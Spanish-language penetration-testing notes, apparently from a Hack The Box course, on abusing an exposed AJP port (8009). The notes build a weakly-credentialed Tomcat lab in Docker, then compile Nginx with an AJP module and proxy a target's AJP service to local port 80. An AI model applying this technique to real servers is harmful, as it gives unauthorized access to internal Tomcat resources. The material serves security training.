### AJP proxy

El proxy AJP es el intermediario entre la comunicación de Apache con Tomcat, un software que sirve como versión optimizada de http exclusiva para Java. Cuando encontramos el puerto 8009 TCP con este servicio podemos llegar a atacarlo. Se haría creando un servidor propio Apache o Nginx para comunicarnos y obtener acceso a recursos a los que no deberíamos tener.

Para crear un entorno con Tomcat vulnerable sería de la siguiente forma

Tomcat-users.xml
```shell-session
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>
```

```shell-session
Astharot15@htb[/htb]$ sudo apt install docker.io
Astharot15@htb[/htb]$ sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
```

### Conectarnos a Tomcat

#### Descargar Nginx
```shell-session
Astharot15@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz
Astharot15@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz
```

#### Compilar Nginx
```shell-session
Astharot15@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git
Astharot15@htb[/htb]$ cd nginx-1.21.3
Astharot15@htb[/htb]$ sudo apt install libpcre3-dev
Astharot15@htb[/htb]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
Astharot15@htb[/htb]$ make
Astharot15@htb[/htb]$ sudo make install
Astharot15@htb[/htb]$ nginx -V

nginx version: nginx/1.21.3
built by gcc 10.2.1 20210110 (Debian 10.2.1-6)
configure arguments: --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
```

(Estamos usando el puerto 8009, el predeterminado para Tomcat pero si no estuviera en uno predeterminado habría que cambiarlo)

#### Apuntar al puerto AJP
/etc/nginx/conf/nginx.conf
```shell-session
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}
```

```shell-session
Astharot15@htb[/htb]$ sudo nginx
Astharot15@htb[/htb]$ curl http://127.0.0.1:80

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/X.X.XX</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/X.X.XX</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
<SNIP>
```

